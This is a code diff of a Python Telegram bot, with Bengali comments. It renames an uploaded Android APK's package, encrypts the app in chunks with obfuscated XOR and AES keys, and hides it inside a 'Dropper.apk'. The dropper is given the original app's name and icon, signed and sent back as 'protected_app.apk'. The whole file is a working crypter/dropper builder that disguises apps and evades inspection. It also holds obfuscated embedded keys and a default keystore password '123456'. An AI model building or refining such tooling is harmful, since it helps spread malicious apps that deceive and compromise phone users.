@@ -52,7 +52,7 @@ DAILY_LIMIT = 1
 # ----- অ্যাডমিন আইডি -----
 ADMIN_USER_ID = 6593195102
 
-# ----- ক্রিপ্টো -----
+# ----- ক্রিপ্টো (আপনার দেওয়া কী) -----
 OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
 OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="
 
@@ -68,8 +68,8 @@ ACTUAL_AES_KEY = decode_obfuscated(OBFUSCATED_AES_KEY_B64)
 ACTUAL_XOR_KEY = decode_obfuscated(OBFUSCATED_XOR_KEY_B64)
 IV_HEX = "aabbccddeeffaabbccddeeffaabbccdd"
 NUM_PARTS = 15
-PREFIX = "part_"   # getSecret(3) returns "part_" – keep as is
-TARGET_PACKAGE = "com.meteah.apl"
+PREFIX = "part_"   # Java getSecret(3) খালি স্ট্রিং দিলে "part_" – যেমনটা আপনার কোডে আছে
+TARGET_PACKAGE = "com.meteah.apl"   # ইউজারের APK-এর package name পরিবর্তন করে এইটা করা হবে
 
 # ----- ডাটাবেস -----
 DB_PATH = 'db/keys.db'
@@ -178,7 +178,7 @@ def mark_asked_to_join(user_id):
     conn.commit()
     conn.close()
 
-# ----- এনক্রিপশন (XOR → AES) -----
+# ----- এনক্রিপশন (XOR → AES) – ইউজারের পরিবর্তিত APK-কে এনক্রিপ্ট করবে -----
 def process_encryption(apk_data: bytes, assets_dir: str):
     xor_step = xor_data(apk_data, ACTUAL_XOR_KEY)
     iv_bytes = bytes.fromhex(IV_HEX)
@@ -212,7 +212,22 @@ def process_encryption(apk_data: bytes, assets_dir: str):
             f.write(bytes(chunk))
     return meta
 
-# ----- APK প্রসেসিং (মূল কাজ) -----
+# ----- একটি APK-কে সাইন করার ফাংশন (v1–v4) -----
+async def sign_apk(apk_path, chat_id, context, keystore_path, password):
+    cmd = f"apksigner sign --ks {keystore_path} --ks-pass pass:{password} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {apk_path}"
+    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
+    if proc.returncode != 0:
+        await context.bot.send_message(chat_id, f"❌ Signing failed:\n{proc.stderr[:500]}")
+        return False
+    # Verify
+    verify_cmd = f"apksigner verify {apk_path}"
+    verify_result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True, timeout=60)
+    if verify_result.returncode != 0:
+        await context.bot.send_message(chat_id, f"⚠️ Verification failed:\n{verify_result.stderr[:500]}")
+        return False
+    return True
+
+# ----- APK প্রসেসিং (মূল কাজ – নতুন ফ্লো) -----
 async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
@@ -220,23 +235,21 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
     await context.bot.send_message(chat_id, "📥 APK received. Processing started.")
     work_dir = tempfile.mkdtemp()
     try:
-        # 1. Save input APK
+        # ---- ধাপ ১: ইউজারের APK সংরক্ষণ ও ডিকম্পাইল ----
         input_apk = os.path.join(work_dir, 'input.apk')
         with open(input_apk, 'wb') as f:
             f.write(apk_data)
         await context.bot.send_message(chat_id, "✅ APK saved.")
 
-        # 2. Decode user APK (to get name & icon)
         await context.bot.send_message(chat_id, "📖 Decoding user APK...")
         decoded_user = os.path.join(work_dir, 'decoded_user')
-        cmd = f"apktool d -f -o {decoded_user} {input_apk}"
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        if result.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Decode user APK failed:\n{result.stderr[:500]}")
+        proc = subprocess.run(f"apktool d -f -o {decoded_user} {input_apk}", shell=True, capture_output=True, text=True, timeout=300)
+        if proc.returncode != 0:
+            await context.bot.send_message(chat_id, f"❌ Decode user APK failed:\n{proc.stderr[:500]}")
             return
         await context.bot.send_message(chat_id, "✅ User APK decoded.")
 
-        # 3. Extract app name
+        # ---- ধাপ ২: ইউজারের APK থেকে নাম ও আইকন বের করা ----
         app_name = "App"
         strings_path = os.path.join(decoded_user, 'res/values/strings.xml')
         if os.path.exists(strings_path):
@@ -251,26 +264,88 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
-        # 4. Decode Dropper.apk
+        # ---- ধাপ ৩: ইউজারের APK-এর package name পরিবর্তন করা (TARGET_PACKAGE) ----
+        await context.bot.send_message(chat_id, f"🔧 Changing package name to {TARGET_PACKAGE}...")
+        manifest_path = os.path.join(decoded_user, 'AndroidManifest.xml')
+        if os.path.exists(manifest_path):
+            with open(manifest_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            match = re.search(r'package="([^"]+)"', content)
+            if match:
+                old_package = match.group(1)
+                # সমস্ত XML ফাইলে package অ্যাট্রিবিউট রিপ্লেস
+                for root, dirs, files in os.walk(decoded_user):
+                    for file in files:
+                        if file.endswith('.xml'):
+                            file_path = os.path.join(root, file)
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                xml_content = f.read()
+                            new_content = re.sub(r'package="' + re.escape(old_package) + r'"', f'package="{TARGET_PACKAGE}"', xml_content)
+                            # আরও সুরক্ষা: যেকোনো অ্যাট্রিবিউট যাতে old_package আছে তা রিপ্লেস
+                            new_content = re.sub(re.escape(old_package), TARGET_PACKAGE, new_content)
+                            if new_content != xml_content:
+                                with open(file_path, 'w', encoding='utf-8') as f:
+                                    f.write(new_content)
+            # Manifest-এ package আপডেট নিশ্চিত করা
+            with open(manifest_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            content = re.sub(r'package="[^"]*"', f'package="{TARGET_PACKAGE}"', content)
+            with open(manifest_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+
+        # ---- ধাপ ৪: ইউজারের পরিবর্তিত APK-কে রিকম্পাইল ও সাইন করা ----
+        await context.bot.send_message(chat_id, "🛠 Rebuilding user APK with new package name...")
+        modified_apk = os.path.join(work_dir, 'modified_user.apk')
+        proc = subprocess.run(f"apktool b -o {modified_apk} {decoded_user}", shell=True, capture_output=True, text=True, timeout=300)
+        if proc.returncode != 0:
+            await context.bot.send_message(chat_id, f"❌ Rebuild user APK failed:\n{proc.stderr[:500]}")
+            return
+        await context.bot.send_message(chat_id, "✅ User APK rebuilt.")
+
+        await context.bot.send_message(chat_id, "🔑 Signing user APK...")
+        keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
+        if not os.path.exists(keystore):
+            await context.bot.send_message(chat_id, "❌ Keystore not found!")
+            return
+        pass_file = os.path.join(os.getcwd(), 'signer', 'keystore_pass.txt')
+        if os.path.exists(pass_file):
+            with open(pass_file, 'r') as f:
+                passwd = f.read().strip()
+        else:
+            passwd = os.environ.get('KEYSTORE_PASS', '123456')
+
+        if not await sign_apk(modified_apk, chat_id, context, keystore, passwd):
+            return
+        await context.bot.send_message(chat_id, "✅ User APK signed.")
+
+        # ---- ধাপ ৫: সাইন করা ইউজার APK-কে এনক্রিপ্ট করা (চাঙ্ক + manifest.json) ----
+        await context.bot.send_message(chat_id, "🔐 Encrypting user APK...")
+        with open(modified_apk, 'rb') as f:
+            modified_apk_data = f.read()
+        # আমরা এখন এনক্রিপ্ট করব – কিন্তু আমাদের কাছে assets_dir হবে Dropper-এর ডিকম্পাইলড ফোল্ডারের assets
+        # আমরা পরে Dropper ডিকম্পাইল করব, এখন শুধু এনক্রিপ্টেড ডেটা মেমোরিতে রাখি
+
+        # ---- ধাপ ৬: Dropper.apk ডিকম্পাইল করা ----
         await context.bot.send_message(chat_id, "📖 Decoding Dropper APK...")
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
             await context.bot.send_message(chat_id, "❌ Dropper.apk not found!")
             return
         decoded_dropper = os.path.join(work_dir, 'decoded_dropper')
-        cmd = f"apktool d -f -o {decoded_dropper} {dropper_apk}"
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        if result.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{result.stderr[:500]}")
+        proc = subprocess.run(f"apktool d -f -o {decoded_dropper} {dropper_apk}", shell=True, capture_output=True, text=True, timeout=300)
+        if proc.returncode != 0:
+            await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{proc.stderr[:500]}")
             return
         await context.bot.send_message(chat_id, "✅ Dropper APK decoded.")
 
-        # 5. Replace assets
-        await context.bot.send_message(chat_id, "🔐 Encrypting and replacing assets...")
+        # ---- ধাপ ৭: এনক্রিপ্ট করা ডেটা Dropper-এর assets-এ বসানো ----
         assets_dir = os.path.join(decoded_dropper, 'assets')
-        process_encryption(apk_data, assets_dir)
+        # আমরা modified_apk_data-কে এনক্রিপ্ট করব
+        process_encryption(modified_apk_data, assets_dir)
+        await context.bot.send_message(chat_id, "✅ Assets replaced with encrypted user APK.")
 
-        # 6. Copy icon and name
+        # ---- ধাপ ৮: ইউজারের আইকন ও নাম Dropper-এ কপি করা ----
+        await context.bot.send_message(chat_id, "🎨 Copying user app icon and name...")
         res_user = os.path.join(decoded_user, 'res')
         res_dropper = os.path.join(decoded_dropper, 'res')
         if os.path.exists(res_user):
@@ -283,7 +358,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                         for f in os.listdir(src):
                             if f.endswith('.png'):
                                 shutil.copy2(os.path.join(src, f), dst)
-
         strings_dst = os.path.join(decoded_dropper, 'res/values/strings.xml')
         if os.path.exists(strings_dst):
             try:
@@ -298,28 +372,12 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
-        # 7. Change package name in all XML files
-        manifest_path = os.path.join(decoded_dropper, 'AndroidManifest.xml')
-        if os.path.exists(manifest_path):
-            with open(manifest_path, 'r', encoding='utf-8') as f:
+        # ---- ধাপ ৯: Dropper-এর manifest-এ শুধু label ও icon সেট করা (package নাম পরিবর্তন করি না) ----
+        manifest_dropper = os.path.join(decoded_dropper, 'AndroidManifest.xml')
+        if os.path.exists(manifest_dropper):
+            with open(manifest_dropper, 'r', encoding='utf-8') as f:
                 content = f.read()
-            match = re.search(r'package="([^"]+)"', content)
-            if match:
-                old_package = match.group(1)
-                for root, dirs, files in os.walk(decoded_dropper):
-                    for file in files:
-                        if file.endswith('.xml'):
-                            file_path = os.path.join(root, file)
-                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                xml_content = f.read()
-                            new_content = re.sub(r'package="' + re.escape(old_package) + r'"', f'package="{TARGET_PACKAGE}"', xml_content)
-                            if new_content != xml_content:
-                                with open(file_path, 'w', encoding='utf-8') as f:
-                                    f.write(new_content)
-            # Update manifest label/icon
-            with open(manifest_path, 'r', encoding='utf-8') as f:
-                content = f.read()
-            content = re.sub(r'package="[^"]*"', f'package="{TARGET_PACKAGE}"', content)
+            # label & icon update – package name অপরিবর্তিত
             if 'android:label="' in content:
                 content = re.sub(r'android:label=".*?"', 'android:label="@string/app_name"', content)
             else:
@@ -328,73 +386,47 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 content = re.sub(r'android:icon=".*?"', 'android:icon="@drawable/img"', content)
             else:
                 content = content.replace('<application ', '<application android:icon="@drawable/img" ')
-            with open(manifest_path, 'w', encoding='utf-8') as f:
+            with open(manifest_dropper, 'w', encoding='utf-8') as f:
                 f.write(content)
 
-        # 8. Rebuild APK
-        await context.bot.send_message(chat_id, "🛠 Rebuilding APK...")
+        # ---- ধাপ ১০: Dropper-কে রিকম্পাইল করা ----
+        await context.bot.send_message(chat_id, "🛠 Rebuilding Dropper APK...")
         output_apk = os.path.join(work_dir, 'output.apk')
-        cmd = f"apktool b -o {output_apk} {decoded_dropper}"
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        if result.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Rebuild failed:\n{result.stderr[:500]}")
+        proc = subprocess.run(f"apktool b -o {output_apk} {decoded_dropper}", shell=True, capture_output=True, text=True, timeout=300)
+        if proc.returncode != 0:
+            await context.bot.send_message(chat_id, f"❌ Rebuild Dropper failed:\n{proc.stderr[:500]}")
             return
-        await context.bot.send_message(chat_id, "✅ APK rebuilt.")
+        await context.bot.send_message(chat_id, "✅ Dropper APK rebuilt.")
 
-        # 9. Align
-        await context.bot.send_message(chat_id, "📦 Aligning APK...")
-        aligned_apk = os.path.join(work_dir, 'aligned.apk')
+        # ---- ধাপ ১১: Dropper-কে অ্যালাইন ও সাইন করা ----
+        await context.bot.send_message(chat_id, "📦 Aligning Dropper APK...")
+        aligned_apk = os.path.join(work_dir, 'aligned_dropper.apk')
         try:
-            subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True)
+            subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True, timeout=120)
         except Exception as e:
             await context.bot.send_message(chat_id, f"❌ Alignment failed: {str(e)}")
             return
-        await context.bot.send_message(chat_id, "✅ APK aligned.")
+        await context.bot.send_message(chat_id, "✅ Dropper APK aligned.")
 
-        # 10. Sign
-        await context.bot.send_message(chat_id, "🔑 Signing APK (v1–v4)...")
-        keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
-        if not os.path.exists(keystore):
-            await context.bot.send_message(chat_id, "❌ Keystore not found! Please upload signer/myKey.p12")
+        await context.bot.send_message(chat_id, "🔑 Signing Dropper APK...")
+        if not await sign_apk(aligned_apk, chat_id, context, keystore, passwd):
             return
-        pass_file = os.path.join(os.getcwd(), 'signer', 'keystore_pass.txt')
-        if os.path.exists(pass_file):
-            with open(pass_file, 'r') as f:
-                passwd = f.read().strip()
-        else:
-            passwd = os.environ.get('KEYSTORE_PASS', '123456')
-
-        cmd = f"apksigner sign --ks {keystore} --ks-pass pass:{passwd} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {aligned_apk}"
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        if result.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Signing failed:\n{result.stderr[:500]}")
-            return
-        await context.bot.send_message(chat_id, "✅ APK signed.")
-
-        # 11. Verify
-        verify_cmd = f"apksigner verify {aligned_apk}"
-        verify_result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True)
-        if verify_result.returncode != 0:
-            await context.bot.send_message(chat_id, f"⚠️ Verification failed:\n{verify_result.stderr[:500]}")
-        else:
-            logger.info("APK verification successful")
-            await context.bot.send_message(chat_id, "✅ Verification successful.")
+        await context.bot.send_message(chat_id, "✅ Dropper APK signed.")
 
         final_apk = aligned_apk
 
-        # 12. Check file size
+        # ---- ধাপ ১২: ফাইল সাইজ চেক ও ইউজারকে পাঠানো ----
         file_size = os.path.getsize(final_apk)
         file_size_mb = file_size / (1024 * 1024)
         if file_size_mb > 50:
             await context.bot.send_message(
                 chat_id,
                 f"⚠️ APK size is {file_size_mb:.1f} MB, which exceeds Telegram's 50 MB limit.\n"
-                "The file may not be delivered. Please use a PC or enable auto‑download for large files."
+                "The file may not be delivered. Please use a PC or enable auto-download for large files."
             )
         else:
             await context.bot.send_message(chat_id, f"📦 Sending APK ({file_size_mb:.1f} MB)...")
 
-        # 13. Send the APK
         try:
             with open(final_apk, 'rb') as f:
                 await context.bot.send_document(chat_id, f, filename="protected_app.apk")
@@ -406,12 +438,16 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         shutil.rmtree(work_dir)
         logger.info(f"APK processing complete for user {user_id}")
 
+    except subprocess.TimeoutExpired:
+        await context.bot.send_message(chat_id, "❌ Processing timed out. Please try again with a smaller APK.")
+        logger.error("subprocess timeout")
+        shutil.rmtree(work_dir, ignore_errors=True)
     except Exception as e:
         logger.error(f"Error: {e}")
         await context.bot.send_message(chat_id, f"❌ Error: {str(e)[:500]}")
         shutil.rmtree(work_dir, ignore_errors=True)
 
-# ----- বট কমান্ড -----
+# ----- বট কমান্ড (অপরিবর্তিত) -----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("📤 Upload APK (Free Daily)", callback_data='upload')],
